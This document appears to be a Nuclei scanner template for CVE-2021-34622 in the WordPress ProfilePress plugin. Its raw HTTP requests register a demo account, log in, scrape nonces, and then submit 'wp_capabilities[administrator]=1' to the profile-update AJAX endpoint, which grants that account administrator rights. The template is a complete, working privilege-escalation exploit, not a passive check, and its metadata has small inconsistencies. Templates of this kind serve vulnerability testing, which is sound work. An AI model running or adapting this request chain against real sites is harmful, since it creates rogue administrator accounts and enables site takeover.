id: CVE-2021-34622

info:
  name: WordPress ProfilePress <= 3.1.3
  author: Sourabh-Sahu
  severity: critical
  description: |
    The ProfilePress plugin allows authenticated users to update their profile including arbitrary usermeta fields. Due to insufficient validation of profile-update inputs, an authenticated user can supply `wp_capabilities` during profile update, enabling escalation to administrator privileges.
  reference:
    - https://wpscan.com/vulnerability/35f57001-830b-431b-b1c6-09481315949b/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-34622
    cwe-id: CWE-269
    cpe: cpe:2.3:a:properfraction:profilepress:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 4
  
  tags: cve20,wp,authenticated

variables:
  username: demo
  password: 123
  email: demo@gmail.com
  boundary: "WebKitFormBoundarypRyCNwmSkLdfNd7E"

requests:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/101.0 Safari/537.36
        Connection: close
        Content-Type: multipart/form-data; boundary={{boundary}}
        Accept-Encoding: gzip

        --{{boundary}}
        Content-Disposition: form-data; name="reg_username"

        {{username}}
        --{{boundary}}
        Content-Disposition: form-data; name="reg_email"

        {{email}}
        --{{boundary}}
        Content-Disposition: form-data; name="reg_password"

        {{password}}
        --{{boundary}}
        Content-Disposition: form-data; name="reg_password_present"

        true
        --{{boundary}}
        Content-Disposition: form-data; name="reg_first_name"

        demo
        --{{boundary}}
        Content-Disposition: form-data; name="reg_last_name"

        demo
        --{{boundary}}
        Content-Disposition: form-data; name="action"

        pp_ajax_signup
        --{{boundary}}--

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/101.0 Safari/537.36
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

        action=pp_ajax_login&data=login_username%3D{{username}}%26login_password%3D{{password}}%26login_form_id%3D1

    cookie-reuse: true

    extractors:
      - type: regex
        name: login_cookie
        part: header
        internal: true
        regex:
          - "wordpress_logged_in_[^=]+=([^;]+);"

  - raw:
      - |
        GET /account/edit-profile/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Connection: close
        Cookie: {{login_cookie}}
        Accept: text/html
        Accept-Encoding: gzip

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Connection: close
        Cookie: {{login_cookie}}
        Content-Type: multipart/form-data; boundary={{boundary}}
        Accept-Encoding: gzip

        --{{boundary}}
        Content-Disposition: form-data; name="reg_username"

        {{username}}
        --{{boundary}}
        Content-Disposition: form-data; name="eup_email"

        {{email}}
        --{{boundary}}
        Content-Disposition: form-data; name="eup_first_name"

        demo
        --{{boundary}}
        Content-Disposition: form-data; name="eup_last_name"

        demo
        --{{boundary}}
        Content-Disposition: form-data; name="eup_display_name"

        demo
        --{{boundary}}
        Content-Disposition: form-data; name="_wpnonce"

        {{wpnonce}}
        --{{boundary}}
        Content-Disposition: form-data; name="nonce"

        {{nonce}}
        --{{boundary}}
        Content-Disposition: form-data; name="ppmyac_form_action"

        updateProfile
        --{{boundary}}
        Content-Disposition: form-data; name="action"

        pp_ajax_editprofile
        --{{boundary}}
        Content-Disposition: form-data; name="is_melange"

        true
        --{{boundary}}
        Content-Disposition: form-data; name="wp_capabilities[administrator]"

        1
        --{{boundary}}--

    extractors:
      - type: regex
        name: wpnonce
        part: body
        internal: true
        group: 1
        regex:
          - 'name="_wpnonce"\s+value="([^"]+)"'
          - "name='_wpnonce'\\s+value='([^']+)'"

      - type: regex
        name: nonce
        part: body
        internal: true
        group: 1
        regex:
          - '"nonce"\s*:\s*"([^"]+)"'
          - 'pp_ajax_form\s*=\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"'

    matchers:
      - type: word
        part: body
        words:
          - "success"
          - "updated"
        condition: or                              
